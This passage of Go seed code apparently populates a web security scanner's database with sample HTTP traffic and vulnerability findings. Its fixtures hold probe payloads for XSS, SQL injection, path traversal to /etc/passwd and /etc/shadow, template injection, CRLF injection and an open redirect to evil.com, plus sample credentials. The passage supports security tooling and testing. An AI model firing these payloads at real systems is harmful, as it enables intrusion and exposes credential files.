			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},
		{method: "GET", path: "/search?q=<img+src=x+onerror=alert(1)>", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 5800, timeMs: 160, title: "Search Results",
			params:     []database.EmbeddedParam{{Name: "q", Value: "<img src=x onerror=alert(1)>", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"reflected-input", "xss-payload"},
		},
		{method: "GET", path: "/feed/rss", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "application/rss+xml", bodyLen: 22000, timeMs: 80, title: "",
			reqHeaders: map[string][]string{"Host": {"blog.test"}, "Accept": {"application/rss+xml"}}, respHeaders: map[string][]string{"Content-Type": {"application/rss+xml; charset=UTF-8"}},
		},

		// ---- legacy.example.com (no scan — ingested traffic) ----
		{method: "GET", path: "/", host: 3, scan: -1, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 3500, timeMs: 350, title: "Legacy Portal",
			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html"}, "Server": {"Apache/2.2"}, "X-Powered-By": {"PHP/5.6"}},
			technology: []string{"apache/2.2", "php/5.6"},
		},
		{method: "GET", path: "/index.php?page=../../../etc/passwd", host: 3, scan: -1, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 1800, timeMs: 280, title: "Legacy Portal",
			params:     []database.EmbeddedParam{{Name: "page", Value: "../../../etc/passwd", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html"}, "Server": {"Apache/2.2"}, "X-Powered-By": {"PHP/5.6"}},
			remarks: []string{"lfi-traversal", "legacy-stack"},
		},
		{method: "POST", path: "/cgi-bin/submit.cgi", host: 3, scan: -1, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 900, timeMs: 420, title: "Form Submitted",
			reqCT: "application/x-www-form-urlencoded", reqBody: []byte("name=test&value=data&token=abc123"),
			params:     []database.EmbeddedParam{{Name: "name", Value: "test", Type: "body"}, {Name: "value", Value: "data", Type: "body"}, {Name: "token", Value: "abc123", Type: "body"}},
			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}, "Content-Type": {"application/x-www-form-urlencoded"}}, respHeaders: map[string][]string{"Content-Type": {"text/html"}, "Server": {"Apache/2.2"}},
		},
		{method: "GET", path: "/old-page", host: 3, scan: -1, status: 301, phrase: "Moved Permanently", contentType: "text/html", bodyLen: 0, timeMs: 25, title: "",
			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}}, respHeaders: map[string][]string{"Location": {"https://example.com/old-page"}, "Server": {"Apache/2.2"}},
		},
		{method: "GET", path: "/redirect?url=https://evil.com", host: 3, scan: -1, status: 302, phrase: "Found", contentType: "text/html", bodyLen: 0, timeMs: 15, title: "",
			params:     []database.EmbeddedParam{{Name: "url", Value: "https://evil.com", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}}, respHeaders: map[string][]string{"Location": {"https://evil.com"}, "Server": {"Apache/2.2"}},
			remarks: []string{"open-redirect"},
		},

		// ---- cdn.example.com (no scan — static assets) ----
		{method: "GET", path: "/images/logo.png", host: 4, scan: -1, status: 200, phrase: "OK", contentType: "image/png", bodyLen: 45000, timeMs: 8, title: "",
			reqHeaders: map[string][]string{"Host": {"cdn.example.com"}}, respHeaders: map[string][]string{"Content-Type": {"image/png"}, "Cache-Control": {"public, max-age=86400"}, "CDN-Cache-Status": {"HIT"}},
		},
		{method: "GET", path: "/fonts/roboto.woff2", host: 4, scan: -1, status: 200, phrase: "OK", contentType: "font/woff2", bodyLen: 67000, timeMs: 6, title: "",
			reqHeaders: map[string][]string{"Host": {"cdn.example.com"}}, respHeaders: map[string][]string{"Content-Type": {"font/woff2"}, "Cache-Control": {"public, max-age=31536000"}, "CDN-Cache-Status": {"HIT"}},
		},
		{method: "GET", path: "/videos/intro.mp4", host: 4, scan: -1, status: 206, phrase: "Partial Content", contentType: "video/mp4", bodyLen: 1048576, timeMs: 45, title: "",
			reqHeaders: map[string][]string{"Host": {"cdn.example.com"}, "Range": {"bytes=0-1048575"}}, respHeaders: map[string][]string{"Content-Type": {"video/mp4"}, "Content-Range": {"bytes 0-1048575/5242880"}, "Accept-Ranges": {"bytes"}},
		},
		{method: "HEAD", path: "/images/logo.png", host: 4, scan: -1, status: 200, phrase: "OK", contentType: "image/png", bodyLen: 0, timeMs: 3, title: "",
			reqHeaders: map[string][]string{"Host": {"cdn.example.com"}}, respHeaders: map[string][]string{"Content-Type": {"image/png"}, "Content-Length": {"45000"}},
		},

		// ---- admin.example.com:8443 (scan 0) ----
		{method: "GET", path: "/admin/", host: 5, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 5600, timeMs: 90, title: "Admin Panel",
			reqAuth:    "Basic YWRtaW46cGFzc3dvcmQ=",
			reqHeaders: map[string][]string{"Host": {"admin.example.com:8443"}, "Authorization": {"Basic YWRtaW46cGFzc3dvcmQ="}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "X-Frame-Options": {"DENY"}},
			remarks: []string{"admin-panel", "basic-auth"},
		},
		{method: "GET", path: "/admin/settings", host: 5, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 8400, timeMs: 105, title: "Settings — Admin",
			reqAuth:    "Basic YWRtaW46cGFzc3dvcmQ=",
			reqHeaders: map[string][]string{"Host": {"admin.example.com:8443"}, "Authorization": {"Basic YWRtaW46cGFzc3dvcmQ="}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},
		{method: "POST", path: "/admin/settings", host: 5, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 8600, timeMs: 150, title: "Settings Saved — Admin",
			reqCT: "application/x-www-form-urlencoded", reqBody: []byte("smtp_host=mail.example.com&smtp_port=587&debug={{7*7}}"),
			params:     []database.EmbeddedParam{{Name: "smtp_host", Value: "mail.example.com", Type: "body"}, {Name: "smtp_port", Value: "587", Type: "body"}, {Name: "debug", Value: "{{7*7}}", Type: "body"}},
			reqAuth:    "Basic YWRtaW46cGFzc3dvcmQ=",
			reqHeaders: map[string][]string{"Host": {"admin.example.com:8443"}, "Content-Type": {"application/x-www-form-urlencoded"}, "Authorization": {"Basic YWRtaW46cGFzc3dvcmQ="}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"ssti-payload", "admin-panel"},
		},
		{method: "GET", path: "/admin/logs?file=../../../etc/shadow", host: 5, scan: 0, status: 200, phrase: "OK", contentType: "text/plain", bodyLen: 2800, timeMs: 60, title: "",
			params:     []database.EmbeddedParam{{Name: "file", Value: "../../../etc/shadow", Type: "url"}},
			reqAuth:    "Basic YWRtaW46cGFzc3dvcmQ=",
			reqHeaders: map[string][]string{"Host": {"admin.example.com:8443"}, "Authorization": {"Basic YWRtaW46cGFzc3dvcmQ="}}, respHeaders: map[string][]string{"Content-Type": {"text/plain"}},
			remarks: []string{"lfi-traversal", "sensitive-file"},
		},
		{method: "GET", path: "/admin/export?format=csv\r\nInjected-Header: evil", host: 5, scan: 0, status: 200, phrase: "OK", contentType: "text/csv", bodyLen: 15000, timeMs: 200, title: "",
			params:     []database.EmbeddedParam{{Name: "format", Value: "csv\r\nInjected-Header: evil", Type: "url"}},
			reqAuth:    "Basic YWRtaW46cGFzc3dvcmQ=",
			reqHeaders: map[string][]string{"Host": {"admin.example.com:8443"}, "Authorization": {"Basic YWRtaW46cGFzc3dvcmQ="}}, respHeaders: map[string][]string{"Content-Type": {"text/csv"}, "Content-Disposition": {"attachment; filename=export.csv"}},
			remarks: []string{"crlf-injection"},
		},

		// ---- Miscellaneous: no-response record, timeout, large body ----
		{method: "GET", path: "/api/v1/slow-endpoint", host: 1, scan: 1, status: 504, phrase: "Gateway Timeout", contentType: "text/html", bodyLen: 250, timeMs: 30000, title: "504 Gateway Timeout",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}}, respHeaders: map[string][]string{"Content-Type": {"text/html"}, "Server": {"nginx"}},
			remarks: []string{"timeout", "server-error"},
		},
		{method: "POST", path: "/api/v1/upload", host: 1, scan: 1, status: 413, phrase: "Payload Too Large", contentType: "application/json", bodyLen: 95, timeMs: 10, title: "",
			reqCT:      "multipart/form-data",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"multipart/form-data; boundary=----formdata"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "GET", path: "/api/v2/beta/experimental", host: 1, scan: -1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 120, timeMs: 25, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "X-Beta-Feature": {"true"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "X-Experimental": {"true"}},
		},

		// ---- Cookie-heavy request ----
		{method: "GET", path: "/account/preferences", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 6800, timeMs: 110, title: "Preferences",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Cookie": {"session=xyz789; theme=dark; lang=en; _ga=GA1.2.123456"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},

		// ---- WebSocket upgrade ----
		{method: "GET", path: "/ws/notifications", host: 0, scan: -1, status: 101, phrase: "Switching Protocols", contentType: "", bodyLen: 0, timeMs: 5, title: "",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Upgrade": {"websocket"}, "Connection": {"Upgrade"}, "Sec-WebSocket-Key": {"dGhlIHNhbXBsZSBub25jZQ=="}}, respHeaders: map[string][]string{"Upgrade": {"websocket"}, "Connection": {"Upgrade"}, "Sec-WebSocket-Accept": {"s3pPLMBiTxaQ9kYGzzhZRbK+xOo="}},
		},

		// ---- GraphQL ----
		{method: "POST", path: "/graphql", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 2400, timeMs: 180, title: "",
			reqCT: "application/json", reqBody: []byte(`{"query":"{ user(id: 1) { name email role } }"}`),
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Content-Type": {"application/json"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},

		// ---- XML/SOAP ----
		{method: "POST", path: "/api/soap/UserService", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/xml", bodyLen: 1800, timeMs: 250, title: "",
			reqCT: "text/xml", reqBody: []byte(`<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><ID>1</ID></GetUser></soap:Body></soap:Envelope>`),
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Content-Type": {"text/xml; charset=UTF-8"}, "SOAPAction": {"GetUser"}}, respHeaders: map[string][]string{"Content-Type": {"text/xml; charset=UTF-8"}},
		},

		// ---- CORS preflight that got blocked ----
		{method: "OPTIONS", path: "/api/v1/admin/config", host: 1, scan: -1, status: 403, phrase: "Forbidden", contentType: "text/plain", bodyLen: 25, timeMs: 4, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Origin": {"https://evil-site.com"}, "Access-Control-Request-Method": {"DELETE"}}, respHeaders: map[string][]string{"Content-Type": {"text/plain"}},
		},
	}

	records := make([]*database.HTTPRecord, 0, len(endpoints))
	for i, ep := range endpoints {
		h := seedHosts[ep.host]
		baseURL := fmt.Sprintf("%s://%s", h.scheme, h.hostname)
		if (h.scheme == "https" && h.port != 443) || (h.scheme == "http" && h.port != 80) {
			baseURL += fmt.Sprintf(":%d", h.port)
		}

		uuid := fmt.Sprintf("rec-%04d-seed-aaaa-bbbb-cccc%04x", i+1, i+1)
		sentAt := now.Add(-time.Duration(len(endpoints)-i) * 30 * time.Second)

		rawReq := buildRawRequest(ep.method, ep.path, h.hostname, h.port, h.scheme, ep.reqHeaders, ep.reqBody)
		respBody := generateSeedBody(ep, h)
		rawResp := buildRawResponse(ep.status, ep.phrase, ep.respHeaders, ep.contentType, respBody)

		scanUUID := ""
		if ep.scan >= 0 && ep.scan < len(scans) {
			scanUUID = scans[ep.scan].UUID
		}

		parentUUID := ""
		if ep.parentPath != "" {
			for _, prev := range records {
				if prev.Hostname == h.hostname && prev.Path == ep.parentPath {
					parentUUID = prev.UUID
					break
				}
			}
		}

		rec := &database.HTTPRecord{
			UUID:     uuid,
			ScanUUID: scanUUID,
			Scheme:   h.scheme,
			Hostname: h.hostname,
			Port:     h.port,
			IP:       h.ip,

			Method:               ep.method,
			Path:                 ep.path,
			URL:                  baseURL + ep.path,
			HTTPVersion:          "HTTP/1.1",
			RequestContentType:   ep.reqCT,
			RequestContentLength: int64(len(ep.reqBody)),
			RawRequest:           rawReq,
			RequestHash:          hashStr(rawReq),
			RequestAuthorization: ep.reqAuth,

			StatusCode:            ep.status,
			StatusPhrase:          ep.phrase,
			ResponseHTTPVersion:   "HTTP/1.1",
			ResponseContentType:   ep.contentType,
			ResponseContentLength: int64(len(respBody)),
			RawResponse:           rawResp,
			ResponseHash:          hashStr(rawResp),
			ResponseTimeMs:        ep.timeMs,
			ResponseWords:         int64(len(respBody) / 5), // approximate word count
			HasResponse:           ep.status > 0,
			ResponseTitle:         ep.title,

			Parameters: ep.params,

			SentAt:     sentAt,
			ReceivedAt: sentAt.Add(time.Duration(ep.timeMs) * time.Millisecond),
			CreatedAt:  sentAt,

			Source:          "seed",
			Remarks:         ep.remarks,
			Technology:      ep.technology,
			ContentHash:     hashStr(respBody),
			IsAuthenticated: ep.reqAuth != "" || hasAuthHeader(ep.reqHeaders),
			ParentUUID:      parentUUID,
			RiskScore:       computeRiskScore(ep.remarks, ep.status),
		}
		records = append(records, rec)
	}

	// Add one record with no response (connection failed)
	noRespUUID := fmt.Sprintf("rec-%04d-seed-aaaa-bbbb-ccccnrsp", len(endpoints)+1)
	noRespRaw := []byte("GET /timeout-endpoint HTTP/1.1\r\nHost: unreachable.internal\r\n\r\n")
	records = append(records, &database.HTTPRecord{
		UUID:        noRespUUID,
		Scheme:      "https",
		Hostname:    "unreachable.internal",
		Port:        443,
		Method:      "GET",
		Path:        "/timeout-endpoint",
		URL:         "https://unreachable.internal/timeout-endpoint",
		HTTPVersion: "HTTP/1.1",
		RawRequest:  noRespRaw,
		RequestHash: hashStr(noRespRaw),
		HasResponse: false,
		SentAt:      now.Add(-25 * time.Hour),
		CreatedAt:   now.Add(-25 * time.Hour),
		Source:      "seed",
	})

	return records
}

// ---------------------------------------------------------------------------
// Finding seeds
// ---------------------------------------------------------------------------

func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Finding {
	now := time.Now()

	// Helper to look up a record UUID by a path substring.
	findRec := func(pathContains string) string {
		for _, r := range records {
			if strings.Contains(r.Path, pathContains) && r.Hostname != "unreachable.internal" {
				return r.UUID
			}
		}
		return records[0].UUID
	}

	findings := []*database.Finding{
		// Reflected XSS on example.com/search
		{
			HTTPRecordUUIDs:  []string{findRec("script>alert")},
			ModuleID:         "xss-reflected-param",
			ModuleName:       "xss",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects reflected cross-site scripting via parameter injection",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Reflected XSS via 'q' parameter — user input is echoed into the HTML response without encoding",
			Severity:         "high",
			Confidence:       "firm",
			Tags:             []string{"xss", "reflected", "owasp-a7"},
			MatchedAt:        []string{"https://example.com/search?q=<script>alert(1)</script>&page=1"},
			ExtractedResults: []string{"<script>alert(1)</script>"},
			Request:          "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E&page=1 HTTP/1.1\r\nHost: example.com\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: <script>alert(1)</script></p>\n<p>No results found for your query.</p>\n</body></html>",
			FindingHash:      hashStr([]byte("xss-reflected-param-example.com-/search-q")),
			FoundAt:          now.Add(-110 * time.Minute),
			CreatedAt:        now.Add(-110 * time.Minute),
		},
		// Reflected XSS on blog.test/search
		{
			HTTPRecordUUIDs:  []string{findRec("onerror=alert")},
			ModuleID:         "xss-reflected-param",
			ModuleName:       "xss",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects reflected cross-site scripting via parameter injection",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Reflected XSS via 'q' parameter — img tag with onerror handler rendered in response",
			Severity:         "high",
			Confidence:       "firm",
			Tags:             []string{"xss", "reflected", "owasp-a7"},
			MatchedAt:        []string{"https://blog.test/search?q=<img+src=x+onerror=alert(1)>"},
			ExtractedResults: []string{"<img src=x onerror=alert(1)>"},
			Request:          "GET /search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E HTTP/1.1\r\nHost: blog.test\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: <img src=x onerror=alert(1)></p>\n<p>No results found.</p>\n</body></html>",
			FindingHash:      hashStr([]byte("xss-reflected-param-blog.test-/search-q")),
			FoundAt:          now.Add(-8 * time.Minute),
			CreatedAt:        now.Add(-8 * time.Minute),
		},
		// SQL injection on api.shop.local
		{
			HTTPRecordUUIDs:  []string{findRec("UNION+SELECT")},
			ModuleID:         "sqli-union-based",
			ModuleName:       "sqli",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects SQL injection via UNION SELECT statement",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Union-based SQL injection in 'search' parameter — database contents leaked via UNION SELECT",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"sqli", "union-based", "owasp-a3"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/products?search='+UNION+SELECT+1,2,3--"},
			ExtractedResults: []string{"1", "2", "3"},
			Request:          "GET /api/v1/products?search=%27+UNION+SELECT+1%2C2%2C3-- HTTP/1.1\r\nHost: api.shop.local\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"results\":[{\"id\":1,\"name\":\"admin\",\"price\":\"s3cr3t_p@ssw0rd\"},{\"id\":2,\"name\":\"root\",\"price\":\"r00t_p@ss!\"},{\"id\":3,\"name\":\"db_version\",\"price\":\"PostgreSQL 14.2\"}],\"total\":3}",
			AdditionalEvidence: []string{
				"GET /api/v1/products?search=%27+UNION+SELECT+1%2C2-- HTTP/1.1\r\nHost: api.shop.local\r\n\r\n\n---------\nHTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\n\r\n{\"error\":\"UNION query must have same number of columns\"}",
				"GET /api/v1/products?search=%27+UNION+SELECT+1%2C2%2C3%2C4-- HTTP/1.1\r\nHost: api.shop.local\r\n\r\n\n---------\nHTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\n\r\n{\"error\":\"UNION query must have same number of columns\"}",
			},
			FindingHash: hashStr([]byte("sqli-union-api.shop.local-/api/v1/products-search")),
			FoundAt:     now.Add(-4*time.Hour - 20*time.Minute),
			CreatedAt:   now.Add(-4*time.Hour - 20*time.Minute),
		},
		// Error-based SQL injection on api.shop.local
		{
			HTTPRecordUUIDs:  []string{findRec("1' OR 1=1--")},
			ModuleID:         "sqli-error-based",
			ModuleName:       "sqli",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects SQL injection via database error messages",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Error-based SQL injection — database error message leaked in response",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"sqli", "error-based", "owasp-a3"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/users/1' OR 1=1--"},
			ExtractedResults: []string{"near \"OR\": syntax error"},
			Request:          "GET /api/v1/users/1'+OR+1%3D1-- HTTP/1.1\r\nHost: api.shop.local\r\n\r\n",
			Response:         "HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\n\r\n{\"error\":\"near \\\"OR\\\": syntax error\",\"detail\":\"SELECT * FROM users WHERE id = '1' OR 1=1--'\",\"code\":\"SQLITE_ERROR\"}",
			FindingHash:      hashStr([]byte("sqli-error-api.shop.local-/api/v1/users")),
			FoundAt:          now.Add(-4*time.Hour - 15*time.Minute),
			CreatedAt:        now.Add(-4*time.Hour - 15*time.Minute),
		},
		// LFI on admin panel
		{
			HTTPRecordUUIDs:  []string{findRec("/admin/logs?file=")},
			ModuleID:         "lfi-path-traversal",
			ModuleName:       "lfi",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects local file inclusion via path traversal",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Local file inclusion via 'file' parameter — /etc/shadow contents readable",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"lfi", "path-traversal", "owasp-a1"},
			MatchedAt:        []string{"https://admin.example.com:8443/admin/logs?file=../../../etc/shadow"},
			ExtractedResults: []string{"root:$6$rounds=656000$ABC123$XYZhashvalue:18000:0:99999:7:::"},
			Request:          "GET /admin/logs?file=../../../etc/shadow HTTP/1.1\r\nHost: admin.example.com:8443\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nroot:$6$rounds=656000$ABC123$XYZhashvalue:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nbin:*:18000:0:99999:7:::\nwww-data:$6$rounds=656000$DEF456$ABChashvalue:18200:0:99999:7:::\npostgres:$6$rounds=656000$GHI789$DEFhashvalue:18300:0:99999:7:::",
			AdditionalEvidence: []string{
				"GET /admin/logs?file=../../../etc/passwd HTTP/1.1\r\nHost: admin.example.com:8443\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n\n---------\nHTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
				"GET /admin/logs?file=../../../etc/hostname HTTP/1.1\r\nHost: admin.example.com:8443\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n\n---------\nHTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nprod-web-01.example.com",
			},
			FindingHash: hashStr([]byte("lfi-path-admin.example.com-/admin/logs-file")),
			FoundAt:     now.Add(-100 * time.Minute),
			CreatedAt:   now.Add(-100 * time.Minute),
		},
		// LFI on legacy
		{
			HTTPRecordUUIDs:  []string{findRec("page=../")},
			ModuleID:         "lfi-path-traversal",
			ModuleName:       "lfi",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects local file inclusion via path traversal",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Local file inclusion via 'page' parameter — /etc/passwd contents included in page output",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"lfi", "path-traversal", "owasp-a1"},
			MatchedAt:        []string{"http://legacy.example.com/index.php?page=../../../etc/passwd"},
			ExtractedResults: []string{"root:x:0:0:root:/root:/bin/bash"},
			Request:          "GET /index.php?page=../../../etc/passwd HTTP/1.1\r\nHost: legacy.example.com\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: Apache/2.2\r\nX-Powered-By: PHP/5.6\r\n\r\n<!DOCTYPE html>\n<html><head><title>Legacy Portal</title></head>\n<body>\n<div class=\"content\">root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\npostgres:x:109:117:PostgreSQL administrator:/var/lib/postgresql:/bin/bash</div>\n</body></html>",
			FindingHash:      hashStr([]byte("lfi-path-legacy.example.com-/index.php-page")),
			FoundAt:          now.Add(-90 * time.Minute),
			CreatedAt:        now.Add(-90 * time.Minute),
		},
		// SSTI on admin settings
		{
			HTTPRecordUUIDs:  []string{findRec("debug={{7*7}}")},
			ModuleID:         "ssti-expression-eval",
			ModuleName:       "ssti",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects server-side template injection via expression evaluation",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Server-side template injection in 'debug' parameter — expression {{7*7}} evaluated to 49",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"ssti", "template-injection", "owasp-a3"},
			MatchedAt:        []string{"https://admin.example.com:8443/admin/settings"},
			ExtractedResults: []string{"49"},
			Request:          "POST /admin/settings HTTP/1.1\r\nHost: admin.example.com:8443\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsmtp_host=mail.example.com&smtp_port=587&debug={{7*7}}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Settings Saved — Admin</title></head>\n<body>\n<h1>Settings Updated</h1>\n<div class=\"flash success\">Settings saved successfully.</div>\n<table>\n<tr><td>SMTP Host</td><td>mail.example.com</td></tr>\n<tr><td>SMTP Port</td><td>587</td></tr>\n<tr><td>Debug</td><td>49</td></tr>\n</table>\n</body></html>",
			FindingHash:      hashStr([]byte("ssti-admin.example.com-/admin/settings-debug")),
			FoundAt:          now.Add(-95 * time.Minute),
			CreatedAt:        now.Add(-95 * time.Minute),
		},
		// CRLF injection
		{
			HTTPRecordUUIDs:  []string{findRec("Injected-Header")},
			ModuleID:         "crlf-header-injection",
			ModuleName:       "crlf",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects CRLF injection in HTTP response headers",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "CRLF injection in 'format' parameter — arbitrary HTTP header injected into response",
			Severity:         "medium",
			Confidence:       "firm",
			Tags:             []string{"crlf", "header-injection", "owasp-a3"},
			MatchedAt:        []string{"https://admin.example.com:8443/admin/export?format=csv\\r\\nInjected-Header: evil"},
			ExtractedResults: []string{"Injected-Header: evil"},
			Request:          "GET /admin/export?format=csv%0d%0aInjected-Header:%20evil HTTP/1.1\r\nHost: admin.example.com:8443\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/csv\r\nInjected-Header: evil\r\nContent-Disposition: attachment; filename=export.csv\r\n\r\nid,name,email,role\n1,admin,admin@example.com,administrator\n2,john,john@example.com,user\n3,jane,jane@example.com,editor",
			FindingHash:      hashStr([]byte("crlf-admin.example.com-/admin/export-format")),
			FoundAt:          now.Add(-98 * time.Minute),
			CreatedAt:        now.Add(-98 * time.Minute),
		},
		// Open redirect
		{
			HTTPRecordUUIDs:  []string{findRec("url=https://evil.com")},
			ModuleID:         "open-redirect",
			ModuleName:       "openredirect",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects open redirect via URL parameter manipulation",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Open redirect via 'url' parameter — user can be redirected to arbitrary external domains",
			Severity:         "medium",
			Confidence:       "firm",
			Tags:             []string{"open-redirect", "owasp-a1"},
			MatchedAt:        []string{"http://legacy.example.com/redirect?url=https://evil.com"},
			ExtractedResults: []string{"https://evil.com"},
			Request:          "GET /redirect?url=https://evil.com HTTP/1.1\r\nHost: legacy.example.com\r\n\r\n",
			Response:         "HTTP/1.1 302 Found\r\nLocation: https://evil.com\r\n\r\n",
			FindingHash:      hashStr([]byte("openredirect-legacy.example.com-/redirect-url")),
			FoundAt:          now.Add(-88 * time.Minute),
			CreatedAt:        now.Add(-88 * time.Minute),
		},
		// Information disclosure — server version
		{
			HTTPRecordUUIDs:  []string{findRec("/cgi-bin/submit")},
			ModuleID:         "info-server-version",
			ModuleName:       "info",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects server version disclosure in response headers",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Server version disclosure — Apache/2.2 and PHP/5.6 revealed in response headers (both are end-of-life)",
			Severity:         "low",
			Confidence:       "firm",
			Tags:             []string{"info", "server-version", "eol"},
			MatchedAt:        []string{"http://legacy.example.com/cgi-bin/submit.cgi"},
			ExtractedResults: []string{"Server: Apache/2.2", "X-Powered-By: PHP/5.6"},
			Request:          "POST /cgi-bin/submit.cgi HTTP/1.1\r\nHost: legacy.example.com\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nServer: Apache/2.2\r\nX-Powered-By: PHP/5.6\r\nContent-Type: text/html\r\n\r\n<html><head><title>Form Submitted</title></head>\n<body>\n<h1>Form Submitted Successfully</h1>\n<p>Thank you for your submission.</p>\n<p>Name: test</p>\n<p>Value: data</p>\n</body></html>",
			FindingHash:      hashStr([]byte("info-server-version-legacy.example.com")),
			FoundAt:          now.Add(-85 * time.Minute),
			CreatedAt:        now.Add(-85 * time.Minute),
		},
		// Missing security headers
		{
			HTTPRecordUUIDs:  []string{findRec("/post/hello-world")},
			ModuleID:         "info-missing-headers",
			ModuleName:       "info",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects missing security headers in HTTP responses",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Missing security headers: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy",
			Severity:         "info",
			Confidence:       "firm",
